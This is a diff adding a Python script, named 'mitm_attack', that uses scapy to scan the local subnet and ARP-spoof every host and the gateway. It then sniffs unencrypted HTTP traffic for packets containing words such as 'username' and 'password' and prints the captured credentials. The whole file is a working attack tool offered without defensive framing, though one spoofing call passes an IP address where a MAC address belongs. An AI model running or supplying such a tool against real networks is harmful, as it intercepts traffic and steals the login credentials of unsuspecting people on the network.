@@ -1,0 +1,106 @@
+#!/usr/bin/env python3
+
+# sudo chmod +x mitm_attack
+
+import scapy.all as scapy
+import socket
+import struct
+import uuid
+import sys
+import time
+
+def get_gateway_linux():
+    with open("/proc/net/route") as fh:
+        for line in fh:
+            fields = line.strip().split()
+            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
+                continue
+            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
+            
+def getmyip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(('8.8.8.8', 1))
+    return s.getsockname()[0]
+
+def getmysubnet(myip):
+    return myip.rsplit('.',1)[0]+'.1/24'
+
+def getlist(ip):
+    arp = scapy.ARP(pdst=ip)
+    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    packet = ether/arp
+    result = scapy.srp(packet, timeout=3, verbose=0)[0]
+    list = []
+    for sent, received in result:
+        list.append({'ip': received.psrc, 'mac': received.hwsrc})
+    return list
+
+def restore(destination_ip,destination_mac, source_ip, source_mac):
+    packet = scapy.ARP(op=2, pdst=destination_ip,
+                       hwdst=destination_mac,
+                       psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+def spoof(target_ip, target_mac, spoof_ip):
+    packet = scapy.ARP(op=2, pdst=target_ip,
+                             hwdst=target_mac,
+                             psrc=spoof_ip)
+    scapy.send(packet, verbose=0)
+    
+def http_header(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["usr","user","uname","username", "passwd","password","pw"]
+        for keyword in keywords:
+            if keyword in str(load):
+                print("-"*9+keyword+" Packet Found"+"-"*9)
+                return "\n".join(packet.sprintf("** {IP:%IP.src% -> %IP.dst%\n\n}{Raw:%Raw.load%\n}-----------------------------------").split(r"\r\n"))
+
+if __name__ == "__main__":
+    attackerIP=getmyip()
+    attackerMAC=':'.join('{:02x}'.format((uuid.getnode() >> ele ) & 0xff) for ele in range(0,8*6,8)[::-1])
+    gatewayIP=get_gateway_linux()
+    target_net=getmysubnet(attackerIP)
+    clients=getlist(target_net)
+    victimlist=[]
+    #print("Available devices in the network:")
+    #print("IP" + " "*18+"MAC")
+    for client in clients:
+        if client['ip']==gatewayIP:
+            gatewayMAC=client['mac']
+        else:
+            victimlist.append({'ip': client['ip'], 'mac': client['mac']})
+        #print(" {:16}    {}".format(client['ip'], client['mac']))
+    #print("\nAttacker IP"+ " "*9 + "MAC")
+    #print(" {:16}    {}".format(attackerIP,attackerMAC))
+    #print("Gateway  IP"+ " "*9 + "MAC")
+    #print(" {:16}    {}".format(gatewayIP,gatewayMAC))
+    print("Victim   IP"+ " "*9+"MAC")
+    for victim in victimlist:
+            print(" {:16}    {}".format(victim['ip'], victim['mac']))
+    print('\n[+] Arp Spoofing')
+    send_packets_count = 0
+    for victim in victimlist:
+        spoof(victim['ip'], attackerIP, gatewayIP)
+        spoof(gatewayIP, gatewayMAC, victim['ip'])
+        send_packets_count += 2
+        print("[+] Packets sent: "+str(send_packets_count)+" Victim : " + victim['ip'])
+        time.sleep(2)
+    print("[+] Spoofing Complete.")
+    
+    print("\n[+] Start Receiving Packet.")
+    print("[+] Searching Packet with login keyword.")
+    print("[+] Ctrl-C to stop receiving packets.")
+    scapy.sniff(prn=http_header, filter="tcp port 80")
+    
+    print("\nRecover to the Origin MAC? "),
+    ans = input('(Y/N) << ').lower()
+    if ans in ['yes', 'y']:
+        for victim in victimlist:
+            restore(victim['ip'], victim['mac'], gatewayIP, gatewayMAC)
+            restore(gatewayIP, gatewayMAC, victim['ip'], victim['mac'])
+        print("Origin Setting have been recovered.")
+    else:
+        print("Exit with Spoofing state.")
+
+
